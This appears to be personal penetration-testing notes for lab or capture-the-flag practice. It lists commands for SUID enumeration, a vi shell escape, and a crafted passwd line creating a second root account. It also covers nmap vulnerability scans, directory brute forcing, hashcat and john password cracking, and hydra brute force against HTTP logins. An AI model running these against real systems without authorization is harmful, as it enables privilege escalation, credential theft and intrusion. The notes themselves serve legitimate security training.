## Finding SUID Binaries
```
find / -perm -u=s -type f 2>/dev/null
```
## Create Salt Passwd
```
openssl passwd -1 -salt [salt] [password]

salt:new passwd:123

new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

## sudo enum
```
sudo -l
```

## vi escalation
```
:!sh
```

## namp
```
allport scan
nmap -vv -sV -p- --script vuln TARGETIP
```

## dirb
```
dirb TARGETURL WORDLIST 
ex :dirb http://hogehoge /usr/share/wordlist/dirbuster/xxxxx.txt
```
## zips
```
tar.gz
-zip
tar -zcvf xxxx.tar.gz directory
-unzip
tar -zxvf xxxx.tar.gz

gz
-unzip
gunzip target

```

## hashcat
```

hashcat -m 0 hases.txt /usr/share/wordlists/rockyou.txt --force

```

## John
- hash
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
```


## hydra bruteforce
```
hydra -l bob -P WORDLIST -t 1 -f HOSTNAME http-get /DIR/
hydra -l bob -P /usr/share/wordlists/rockyou.txt -t 1 -f 10.10.2.215 http-get /protected/
```
## nikto
```
nikto -h host:port

```

## useful links
GTFOBins  : unix binaries list
- https://gtfobins.github.io/#


Metasploit
- reverse_tcp payload
  - https://netsec.ws/?p=331

- meterpreter basis
  - https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

hash
- hash identifier
  - https://www.tunnelsup.com/hash-analyzer/
 - hash resolver
  - https://crackstation.net/
